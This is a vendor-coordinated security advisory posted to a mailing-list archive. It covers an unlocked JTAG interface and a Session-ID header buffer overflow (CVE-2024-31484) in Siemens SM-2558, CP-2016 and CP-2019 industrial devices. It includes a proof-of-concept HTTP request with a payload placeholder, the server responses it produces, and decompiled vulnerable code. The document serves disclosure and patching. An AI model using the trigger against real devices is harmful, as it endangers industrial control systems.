<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 &amp; CP-2019"/>
<meta name="Author" content="SEC Consult Vulnerability Lab via Fulldisclosure"/>
<title>Full Disclosure: SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 &amp; CP-2019</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#18">By Date</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="16"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#18">By Thread</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 &amp; CP-2019</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: SEC Consult Vulnerability Lab via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Mon, 25 Nov 2024 08:32:17 +0000<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">
SEC Consult Vulnerability Lab Security Advisory &lt; 20241125-0 &gt;
=======================================================================
              title: Unlocked JTAG interface and buffer overflow
            product: Siemens SM-2558 Protocol Element (extension module for
                     Siemens SICAM AK3/TM/BC),
                     Siemens CP-2016 &amp; CP-2019
 vulnerable version: JTAG: Unknown HW revision, Zynq Firmware Version 10A45
                     Buffer overflow: &lt;V10.46 (ETA4), &lt;V03.27 (ETA5),
                     &lt;V06.02 (CPCX26), &lt;V06.05 (PCCX26)
      fixed version: JTAG: SM-2558 hardware is EOL
                     Buffer overflow: V06.02 (CPCX26), V10.46 (ETA4),
                     V03.27 (ETA5), V06.05 (PCCX26)
             impact: High
           homepage: <a  rel="nofollow" href="https://www.siemens.com">https://www.siemens.com</a>
              found: 2023-07-11
                 by: Stefan Viehböck (Office Linz)
                     Constantin Schieber-Knöbl (Office Vienna)
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     <a  rel="nofollow" href="https://www.sec-consult.com">https://www.sec-consult.com</a>

=======================================================================

Vendor description:
-------------------
&quot;We are a technology company focused on industry, infrastructure,
transport, and healthcare. From more resource-efficient factories,
resilient supply chains, and smarter buildings and grids, to cleaner
and more comfortable transportation as well as advanced healthcare,
we create technology with purpose adding real value for customers.&quot;

Source: <a  rel="nofollow" href="https://new.siemens.com/global/en/company/about.html">https://new.siemens.com/global/en/company/about.html</a>


Business recommendation:
------------------------
Upgrade to the latest firmware version to mitigate the buffer overflow.

The hardware (SM-2558) is considered end of life (EOL), thus no new
version with a fixed JTAG will be released. Restrict physical access
to the device.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.


Vulnerability overview/description:
-----------------------------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface can be accessed with physical access to the PCB.
After slightly modifying the hardware it is possible to connect to
the interface with full access to the communication module.

2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 &amp; CP-2019 (CVE-2024-31484)
The webserver running on the SM-2558 device as well as CP-2016 and CP-2019
is vulnerable to a buffer overflow vulnerability.

The value of the HTTP header &quot;Session-ID&quot; is processed and used in an
&quot;sprintf&quot; call without proper length checking. The target buffer is in the
BSS segment and likely 1024 bytes in length. The buffer overflows into several
other global data structures.


Proof of concept:
-----------------
1) Unlocked JTAG Interface of Zynq-7000 on SM-2558
The JTAG interface pins (TDI, TDO, TCK, TMS, GND) are accessible on a populated
20-pin header on the PCB (see [figure_1]).

A removed connection needs to be restored by soldering an additional wire
between two exposed contacts (see [figure_2]), as the JTAG interface of the
Zynq-7000 is daisy-chained with the JTAG interface of the Broadcom BCM53101M
Ethernet controller. The pad in question connects to pin A57 (TDI) of the Ethernet
controller. After connecting to the pins, a connection to the Zynq-7000 JTAG
interface is possible. E.g., memory can be dumped ([figure_5]), execution can be
single stepped  ([figure_4]) or halted ([figure_3]), and variables changed.
This grants an attacker with physical access full control of the communication
module.


2) Buffer Overflow on the Webserver of the SM-2558, CP-2016 &amp; CP-2019 (CVE-2024-31484)
The vulnerability can be triggered with a HTTP POST request similar to the
following one:

POST /SICAM_TOOLBOX_1703_remote_connection_01.htm HTTP/1.1
User-Agent: SICAM TOOLBOX II
Version: 1
Session-ID: 3814280BA9922f30_BOF_PAYLOAD_HERE
Sequence-ID: 525
Content-Length: 54
Content-Type: text/plain
KeepAlive: 5
Connection: close

type=1&amp;length=15&amp;data=0780640202fef1e60000feff0100c2


Here are a few observations with different Session-ID values:

a) Session ID value 3814280BA9922f30 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd0
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

b) Session ID value 3814280BA992fd00000000000000 results in normal behavior
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd00000000000000
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 0

c) Session ID value 3814280BA992fd00000000000000... (in total 618 characters) results in three HTTP responses
HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992fd000000HTTP/1.1 200 OK
Server: SICAM 1703
Version: 1
Session-ID: 3814280BA992
Sequence-ID: 1
Content-Type: text/plain
Content-Length: 8

type=4

d) Session ID value 3814280BA992fd00000000000000... (in total 1260 characters) results in a HTTP 500 - internal server 
error
HTTP/1.1 500 Internal Server Error
Content-Type: text/html
Content-Length: 198

&lt;html&gt;&lt;head&gt;&lt;title&gt;500 Internal Server Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Internal Server Error&lt;/h1&gt;&lt;p&gt;Sorry, an unexpected internal server 
error occurred while processing your request.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;


Pseudocode of vulnerable function:
[...]
    sessiond_id = (char *)get_http_header(a1, (int)&quot;Session-ID&quot;); &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; session_id is extracted from HTTP 
request
    if ( !sessiond_id )
      goto LABEL_194;
    if ( unk_51CD1C )
    {
      v11 = 0;
    }
    else
    {
      sub_3DB0E4((unsigned int)byte_51CD08, (unsigned int)sessiond_id, 0x14u);
      v11 = 1;
    }
    if ( sub_15332C() == 1 )
    {
      v134 = 0;
      if ( sub_155BC4(a1, (int)v133) || !v134 )
      {
LABEL_49:
        sequence_id = get_http_header_int(a1, &quot;Sequence-ID&quot;);
        sprintf(                      &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; response_buffer overflows here
          response_buffer,
          &quot;HTTP/1.1 200 OK\r\n&quot;
          &quot;Server: %s\r\n&quot;
          &quot;Version: %u\r\n&quot;
          &quot;Session-ID: %s\r\n&quot;
          &quot;Sequence-ID: %lu\r\n&quot;
          &quot;Content-Type: text/plain\r\n&quot;
          &quot;Content-Length: 0\r\n&quot;
          &quot;\r\n&quot;,
          &quot;SICAM 1703&quot;,
          1,
          sessiond_id,
          sequence_id);
[...]


Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
- Webserver that runs on Firmware Version 10A45 of the Zynq FPGA.
- The Hardware revision of the device was unknown.

According to the vendor, the following firmware versions for the SM-2558
are affected by CVE-2024-31484:
* ETA4 Ethernet Interface IEC60870-5-104: All versions &lt; V10.46
* ETA5 Ethernet Int. 1x100TX IEC61850 Ed.2: All versions &lt; V03.27

Note that the same vulnerability exists as well in other products&apos;
firmware versions, namely:
* CPCX26 Central Processing/Communication for CP-2016: All versions &lt; V06.02
* PCCX26 Ax 1703 PE, Contr, Communication Element for CP-2019: All versions &lt; V06.05


Vendor contact timeline:
------------------------
2024-03-05: Contacting vendor through productcert () siemens com
2024-03-06: Siemens tracks this as #22436
2024-04-03: Requested status update.
2024-04-03: Siemens can reproduce vulnerabilities and will evaluate buffer overflow.
            Hardware is EOL, no fix for the JTAG issue.
2024-06-11: Siemens publishes SSA-620338 and confirms the buffer overflow.
2024-07 - 2024-09: Various vacation / absences, delaying advisory coordination.
2024-10-22: Meeting with ProductCERT, discussing release of SM-2558 advisory.
2024-10-31: Sending advisory draft to ProductCERT.
2024-11-14: Receiving feedback on advisory draft.
2024-11-19: Sending updated advisory to ProductCERT.
2024-11-25: Coordinated release of advisory.


Solution:
---------
The vendor provides patches for the affected devices / components
to fix CVE-2024-31484:
* ETA4 for SM-2558: Upgrade to V10.46
* ETA5 for SM-2558: Upgrade to V03.27
* CPCX26 for CP-2016: Upgrade to V06.02
* PCCX26 for CP-2019: Upgrade to V06.05

More detailed information can be found in the Siemens Security Advisory SSA-620338:
<a  rel="nofollow" href="https://cert-portal.siemens.com/productcert/html/ssa-620338.html">https://cert-portal.siemens.com/productcert/html/ssa-620338.html</a>

The hardware (SM-2558) is considered end of life (EOL), thus no new version
with a fixed JTAG will be released. Restrict physical access to the device.


Workaround:
-----------
Make sure to strictly limit physical access to the PLCs containing the protocol
element during and also after its life cycle.


Advisory URL:
-------------
<a  rel="nofollow" href="https://sec-consult.com/vulnerability-lab/">https://sec-consult.com/vulnerability-lab/</a>


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Eviden business
Europe | Asia

About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
Eviden business. It ensures the continued knowledge gain of SEC Consult in the
field of network and application security to stay ahead of the attacker. The
SEC Consult Vulnerability Lab supports high-quality penetration testing and
the evaluation of new offensive and defensive technologies for our customers.
Hence our customers obtain the most current information about vulnerabilities
and valid recommendation about the risk profile of new technologies.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <a  rel="nofollow" href="https://sec-consult.com/career/">https://sec-consult.com/career/</a>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <a  rel="nofollow" href="https://sec-consult.com/contact/">https://sec-consult.com/contact/</a>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <a  rel="nofollow" href="https://www.sec-consult.com">https://www.sec-consult.com</a>
Blog: <a  rel="nofollow" href="https://blog.sec-consult.com">https://blog.sec-consult.com</a>
Twitter: <a  rel="nofollow" href="https://twitter.com/sec_consult">https://twitter.com/sec_consult</a>

EOF Constantin Schieber-Knöbl, Stefan Viehböck / @2024
</pre><p><a href="att-18/figure_1.png" ><img src="att-18/figure_1.png"></a></p>
<p><a href="att-18/figure_2.png" ><img src="att-18/figure_2.png"></a></p>
<p><a href="att-18/figure_3.png" ><img src="att-18/figure_3.png"></a></p>
<p><a href="att-18/figure_4.png" ><img src="att-18/figure_4.png"></a></p>
<p><a href="att-18/figure_5.png" ><img src="att-18/figure_5.png"></a></p>
<p><strong>Attachment:
<a href="att-18/smime_p7s.bin" ><tt>smime.p7s</tt></a></strong><br>
<em>Description:</em> S/MIME Cryptographic Signature</p>
<pre style="margin: 0em;">_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="https://seclists.org/fulldisclosure/">https://seclists.org/fulldisclosure/</a></pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#18">By Date</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="16"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#18">By Thread</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>SEC Consult SA-20241125-0 :: Unlocked JTAG interface and buffer overflow in Siemens SM-2558 Protocol Element, Siemens CP-2016 &amp; CP-2019</strong> <em>SEC Consult Vulnerability Lab via Fulldisclosure (Nov 27)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

